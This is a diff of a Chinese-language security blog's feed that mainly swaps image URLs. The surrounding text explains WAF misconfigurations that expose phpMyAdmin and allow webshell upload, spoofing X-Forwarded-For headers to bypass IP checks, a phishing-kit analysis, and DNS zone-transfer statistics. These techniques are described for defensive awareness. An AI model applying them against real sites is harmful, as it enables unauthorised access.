 &lt;p&gt;但在有建置 WAF 的架構之下，Client 透過 WAF 存取網站，網站得到的 IP 會是 WAF 的 IP：192.168.1.10，因此允許連線，Client 因而取得原本需在內網才能存取的資料。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-hlQZaYZcEZE/U8jvhb5DHoI/AAAAAAAAAjw/jb2tUe10cl8/s2560/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-hlQZaYZcEZE/U8jvhb5DHoI/AAAAAAAAAjw/jb2tUe10cl8/w784-h233-no/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;因為 WAF 而繞過 IP 限制&quot; title=&quot;因為 WAF 而繞過 IP 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;因為 WAF 而繞過 IP 限制&quot; title=&quot;因為 WAF 而繞過 IP 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;實際案例&quot;&gt;實際案例&lt;/h3&gt;
 
@@ -5091,15 +5372,15 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;如果照著預設的設定，以現成的案例來看，能夠存取 Apache Server 的系統狀態，其中可以看到網站所有連線以及 URI 等資料。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-EO9Rkiws9UI/U8jvhN47OoI/AAAAAAAAAj0/huRQZAHBaWM/s2560/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-EO9Rkiws9UI/U8jvhN47OoI/AAAAAAAAAj0/huRQZAHBaWM/w827-h678-no/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;預設開放 Apache 伺服器狀態&quot; title=&quot;預設開放 Apache 伺服器狀態&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;預設開放 Apache 伺服器狀態&quot; title=&quot;預設開放 Apache 伺服器狀態&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;並且可以直接讀取 phpMyAdmin 介面，並且至資料庫中新增、修改、刪除資料，甚至直接上傳 webshell 進入主機。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-qLCILB4qbsI/U8jvhvJxMHI/AAAAAAAAAkQ/JrGBK7N2SgQ/s2560/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-qLCILB4qbsI/U8jvhvJxMHI/AAAAAAAAAkQ/JrGBK7N2SgQ/w860-h678-no/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;直接進入 phpMyAdmin 管理介面&quot; title=&quot;直接進入 phpMyAdmin 管理介面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;直接進入 phpMyAdmin 管理介面&quot; title=&quot;直接進入 phpMyAdmin 管理介面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;XAMPP 也內建了網站記錄分析工具 webalizer，透過這個介面可以知道網站所有進入點的流量、統計數據等。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-22UDz3CWOzw/U8jvig8XCfI/AAAAAAAAAkM/JlDEr1YQXL4/s2560/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-22UDz3CWOzw/U8jvig8XCfI/AAAAAAAAAkM/JlDEr1YQXL4/w860-h678-no/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;網站記錄分析工具 webalizer&quot; title=&quot;網站記錄分析工具 webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;網站記錄分析工具 webalizer&quot; title=&quot;網站記錄分析工具 webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;小結&quot;&gt;小結&lt;/h3&gt;
 
@@ -5114,7 +5395,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
    <id>https://devco.re/blog/2014/07/03/apple-id-phishing-scam</id>
    <content type="html">&lt;p&gt;今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/s2560/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/w678-h440-no/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID 釣魚信&quot; title=&quot;Apple ID 釣魚信&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID 釣魚信&quot; title=&quot;Apple ID 釣魚信&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -5159,13 +5440,13 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;收到惡意郵件、釣魚郵件，一定要好好看信件的標頭檔（Header）。裡面通常可以看到攻擊者發信的來源，例如是自己架設的發信伺服器或者是使用肉雞來發信。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-DSvLz6-NiA4/U7UTt5j6t3I/AAAAAAAAAiE/I0iX66vNa0E/s2560/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-DSvLz6-NiA4/U7UTt5j6t3I/AAAAAAAAAiE/I0iX66vNa0E/w1044-h582-no/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID 釣魚信 Header&quot; title=&quot;Apple ID 釣魚信 Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID 釣魚信 Header&quot; title=&quot;Apple ID 釣魚信 Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;信件標頭最重要的就是「Received」這個部分，要由下往上閱讀。從這邊我們可以看到信件的流向，從攻擊發起者到發信伺服器，中間經過其他伺服器的轉送，最後到收到釣魚信件的郵件伺服器。因此從最下面的 Received 位置，我們可以知道攻擊者是從「selecttr@cloud.httpdns.co」來寄送信件的，因此 cloud.httpdns.co 很有可能就是攻擊者的伺服器，或者是被駭來發信的伺服器。&lt;/p&gt;
 
 &lt;p&gt;如果覺得信件的標頭太長難以閱讀，可以利用 Google 提供的工具「&lt;a href=&quot;https://toolbox.googleapps.com/apps/messageheader/&quot;&gt;Google Apps Toolbox - Messageheader&lt;/a&gt;」。只要把信件的標頭貼上，他就會自動分析信件的流向，如下圖。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-5Kz28O5Y_QQ/U7UdDqQzuRI/AAAAAAAAAis/nLqhaKijwIc/s2560/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-5Kz28O5Y_QQ/U7UdDqQzuRI/AAAAAAAAAis/nLqhaKijwIc/w962-h403-no/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;檢查信件 header&quot; title=&quot;檢查信件 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;檢查信件 header&quot; title=&quot;檢查信件 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;釣魚網頁也請你注重安全啊&quot;&gt;釣魚網頁，也請你注重安全啊。&lt;/h3&gt;
 
@@ -5173,23 +5454,23 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;我們可以看到這個釣魚頁面做得非常像，上面要你輸入帳號、密碼、姓名、生日、信用卡號等資訊，非常惡劣。唯有網址實在是太假，希望沒有人眼拙真的以為這是 Apple 的網站。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-roay8gwb1xg/U7UTuUnkDxI/AAAAAAAAAic/Za7ARXd50gE/s2560/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-roay8gwb1xg/U7UTuUnkDxI/AAAAAAAAAic/Za7ARXd50gE/w897-h678-no/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID 釣魚網頁&quot; title=&quot;Apple ID 釣魚網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID 釣魚網頁&quot; title=&quot;Apple ID 釣魚網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;秉持的資安研究員的好習慣，我們把網址子目錄去掉，看看網站的根目錄長什麼樣子，結果讓人跌破眼鏡。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-9othIZ0WnKQ/U7UTt_UVaSI/AAAAAAAAAh4/Wufvr0iIgHI/s2560/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-9othIZ0WnKQ/U7UTt_UVaSI/AAAAAAAAAh4/Wufvr0iIgHI/w897-h678-no/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;釣魚網頁開放目錄瀏覽&quot; title=&quot;釣魚網頁開放目錄瀏覽&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;釣魚網頁開放目錄瀏覽&quot; title=&quot;釣魚網頁開放目錄瀏覽&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;釣魚網站也請你注重安全啊！&lt;/strong&gt;這個網站大剌剌的開著目錄索引，讓我們可以看到網站上的各個目錄、檔案。除了 Apple 的釣魚網頁之外，甚至有釣魚網頁的原始碼「connect-info.zip」，更有著其他釣魚網頁在同個站上。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-F1tIkSqFbsM/U7UTu8R0Y1I/AAAAAAAAAiQ/5pxB467FPlM/s2560/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-F1tIkSqFbsM/U7UTu8R0Y1I/AAAAAAAAAiQ/5pxB467FPlM/w897-h678-no/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;站上其他釣魚頁面&quot; title=&quot;站上其他釣魚頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;站上其他釣魚頁面&quot; title=&quot;站上其他釣魚頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;既然可以瀏覽，那我們來看看釣魚網頁的原始碼寫得怎樣。抓下來解開之後會看到完整的釣魚網頁，以及接收受騙人資料的主程式「Snd.php」。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-0v_MrZOZf9A/U7UTvO9EgqI/AAAAAAAAAiM/qqW2mrwy500/s2560/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-0v_MrZOZf9A/U7UTvO9EgqI/AAAAAAAAAiM/qqW2mrwy500/w706-h574-no/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;下載釣魚網頁原始碼&quot; title=&quot;下載釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;下載釣魚網頁原始碼&quot; title=&quot;下載釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;釣魚網頁的程式寫得非常簡單，僅把網頁上接收到的被害人資料、IP，寄送到他的信箱「 justforhacke@gmail.com 」，寄送完畢後會自動導向到官方的頁面偽裝。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-1-GdwVT5nkQ/U7UTvu91imI/AAAAAAAAAiY/VCEV9Eo2oMo/s2560/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-1-GdwVT5nkQ/U7UTvu91imI/AAAAAAAAAiY/VCEV9Eo2oMo/w797-h607-no/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;釣魚網頁原始碼&quot; title=&quot;釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;釣魚網頁原始碼&quot; title=&quot;釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;如果釣魚網頁寫得不好，甚至我們有機會可以攻擊他釣魚網頁上的漏洞，直接取得主機的權限，解救世人。從原始碼我們一目了然釣魚網頁的行為、寫法，也可以尋找有無攻擊的機會。&lt;/p&gt;
 
@@ -5282,15 +5563,15 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;舉例來說，我寫了一個小程式，偵測這些常見的 HTTP Header 判斷 IP。並且使用 &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt; 這個工具來修改 HTTP Request。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-OLYyle4PQ48/U5lB8SLR_DI/AAAAAAAAAc4/yHvzlGfNAAs/s2400/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-OLYyle4PQ48/U5lB8SLR_DI/AAAAAAAAAc4/yHvzlGfNAAs/w897-h678-no/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;顯示目前 IP 以及相關 header&quot; title=&quot;顯示目前 IP 以及相關 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;顯示目前 IP 以及相關 header&quot; title=&quot;顯示目前 IP 以及相關 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;頁面上顯示目前我目前的 IP「49.50.68.17」，並且其他的 header 是空的。但如果我今天使用 Burp Suite 之類的 Proxy 工具自行竄改封包，加上 X-Forwarded-For 或是 Client-IP header：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-GC77ijJxN-U/U5lB8NrnGwI/AAAAAAAAAdA/pqJDjoxUeu0/s2400/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-GC77ijJxN-U/U5lB8NrnGwI/AAAAAAAAAdA/pqJDjoxUeu0/w744-h480-no/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; title=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; title=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;修改完畢之後，再到原本的顯示 IP 介面，會發現網頁錯將我竄改的 header 當作正確的資料填入。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-hHA7NtX_9KI/U5lB8Nn1VjI/AAAAAAAAAc0/umHpFoGWDDo/s2400/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-hHA7NtX_9KI/U5lB8Nn1VjI/AAAAAAAAAc0/umHpFoGWDDo/w897-h678-no/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;顯示遭到竄改的 HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;顯示遭到竄改的 HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;使用代理伺服器-proxy-的情況&quot;&gt;使用代理伺服器 Proxy 的情況&lt;/h3&gt;
 
@@ -5332,15 +5613,11 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;在我們測試的過程中，通常我們都會讓瀏覽器自帶 X-Forwarded-For，並且自行填入 IP。常常會發現有一些網站出現如下的警告…&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-mWMLyw8Z924/U5lB8y19t5I/AAAAAAAAAc8/PgGRibfggZM/s2400/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-mWMLyw8Z924/U5lB8y19t5I/AAAAAAAAAc8/PgGRibfggZM/w268-h139-no/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! 顯示 IP 錯誤&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! 顯示 IP 錯誤&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;有沒有搞錯？「上次登入位置 127.0.0.1」？沒錯，這個是知名論壇套件「&lt;a href=&quot;http://www.discuz.net/&quot;&gt;Discuz!&lt;/a&gt;」的功能，抓取 IP 的功能也是不安全的寫法。也有這樣的經驗，之前開著 X-Forwarded-For 的 header 到一些網站，竟然直接出現管理者後台！&lt;/p&gt;
 
-&lt;p&gt;你覺得只有一般人撰寫的程式會有這樣的問題嗎？其實大型網站也可能會有類似的問題：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-4UPvfv9JbiM/U5p3CLiPXNI/AAAAAAAAAdU/Y6cNICTdCKk/s2400/2014-06-12-client-ip-detection-05-ruten-detect-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-4UPvfv9JbiM/U5p3CLiPXNI/AAAAAAAAAdU/Y6cNICTdCKk/w752-h551-no/2014-06-12-client-ip-detection-05-ruten-detect-user-ip.png&quot; alt=&quot;露天拍賣顯示 IP&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;先不論為什麼 127.0.0.1 會在美國，這樣的寫法可能會讓管理者永遠抓不到犯罪者的真實 IP，甚至攻擊者可以竄改 header 插入特殊字元，對網站進行 SQL Injection 或者 Cross-Site Scripting 攻擊。&lt;/p&gt;
+&lt;p&gt;你覺得只有一般人撰寫的程式會有這樣的問題嗎？其實大型網站也可能會有類似的問題。這樣的寫法可能會讓管理者永遠抓不到犯罪者的真實 IP，甚至攻擊者可以竄改 header 插入特殊字元，對網站進行 SQL Injection 或者 Cross-Site Scripting 攻擊。&lt;/p&gt;
 
 &lt;h3 id=&quot;正確又安全的方式&quot;&gt;正確又安全的方式&lt;/h3&gt;
 
@@ -5374,7 +5651,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
    <id>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</id>
    <content type="html">&lt;h3 id=&quot;zone-transfer-世界大揭秘&quot;&gt;Zone Transfer 世界大揭秘&lt;/h3&gt;
 
-&lt;p&gt;還記得在上一篇文章 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題&lt;/a&gt;中我們曾提到，若對全世界的網站進行 zone transfer 檢測恐怕會有更多驚人的案例嗎？正好 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 提供了全球排名前一百萬名的網站資料&lt;/a&gt;，我們就以這份資料為基礎來做一些統計吧！&lt;/p&gt;
+&lt;p&gt;還記得在上一篇文章 &lt;a href=&quot;https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題&lt;/a&gt;中我們曾提到，若對全世界的網站進行 zone transfer 檢測恐怕會有更多驚人的案例嗎？正好 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 提供了全球排名前一百萬名的網站資料&lt;/a&gt;，我們就以這份資料為基礎來做一些統計吧！&lt;/p&gt;
 
 &lt;h3 id=&quot;有問題的-domain-總數與比例&quot;&gt;有問題的 domain 總數與比例&lt;/h3&gt;
 
@@ -5410,7 +5687,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-taAD_Ilxm2c/U2mqBEzEx2I/AAAAAAAAAVY/Jv-_PR7i9xQ/w494-h750-no/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-taAD_Ilxm2c/U2mqBEzEx2I/AAAAAAAAAVY/Jv-_PR7i9xQ/w494-h750-no/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer 問題的 TLD 相關統計&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer 問題的 TLD 相關統計&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;.tw 網域排第二十一名，幸好這次不是世界第一了，否則又是另類的台灣之光。&lt;/p&gt;
 
@@ -5422,7 +5699,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-VNyNVj3MkAA/U2mqBMfEKfI/AAAAAAAAAVU/FGGPow_qt_E/w367-h693-no/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-VNyNVj3MkAA/U2mqBMfEKfI/AAAAAAAAAVU/FGGPow_qt_E/w367-h693-no/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer 問題的 name server 相關統計&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer 問題的 name server 相關統計&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;可執行 zone transfer 且不重複的 namer server 共有 53830 個&lt;/p&gt;
@@ -5588,7 +5865,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
    <link href="https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/"/>
    <updated>2014-06-11T00:00:00+08:00</updated>
    <id>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</id>
-   <content type="html">&lt;p&gt;上次我們提到了 &lt;a href=&quot;http://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;
+   <content type="html">&lt;p&gt;上次我們提到了 &lt;a href=&quot;https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;
 
 &lt;h3 id=&quot;httponly-簡介&quot;&gt;HttpOnly 簡介&lt;/h3&gt;
 
@@ -5596,13 +5873,13 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;h3 id=&quot;httponly-主要作用&quot;&gt;HttpOnly 主要作用&lt;/h3&gt;
 
-&lt;p&gt;說明 HttpOnly 主要作用之前，先談談 XSS 最常見的利用方式。XSS 攻擊早在 1990 年就被發現，此攻擊手法最常見的利用方式是存取使用者的 cookie 來獲得一些機敏資料。像是存取 session cookie 即可盜用使用者的身份（關於 session 的重要性，可以參考我們部落格的另一篇文章 &lt;a href=&quot;http://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session 攻擊與防護&lt;/a&gt;），如果在 cookie 中記錄了其他機敏資訊，也可能會一併遭竊。因此若能阻止攻擊者存取帶有敏感資料的 cookie，就能減少 XSS 對使用者的影響，因而催生了 HttpOnly 機制。&lt;/p&gt;
